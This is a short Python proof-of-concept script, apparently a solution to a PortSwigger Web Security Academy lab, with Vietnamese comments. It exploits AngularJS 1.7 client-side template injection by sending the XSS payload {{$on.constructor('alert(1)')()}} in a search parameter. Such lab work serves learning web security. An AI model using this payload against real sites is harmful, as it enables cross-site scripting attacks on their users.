# phiên bản Angular sử dụng: v1.7 (là phiên bản không có sandbox)
# dữ liệu người dùng nhập vào sẽ được sử dụng như một template 
# ng-app được sử dụng ở body khẳng định sự tồn tại của Angular
# chúng ta sẽ lợi dụng điều này để thực thi mã tùy ý 
# chèn '{{$on.constructor("alert(1)")()}}' vào ô tìm kiếm

import requests

burp0_url = "https://0a9d001e044d9b758076032b000d0041.web-security-academy.net/"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}
payload="{{$on.constructor('alert(1)')()}}"
requests.get(burp0_url, headers=burp0_headers, params={"search":payload})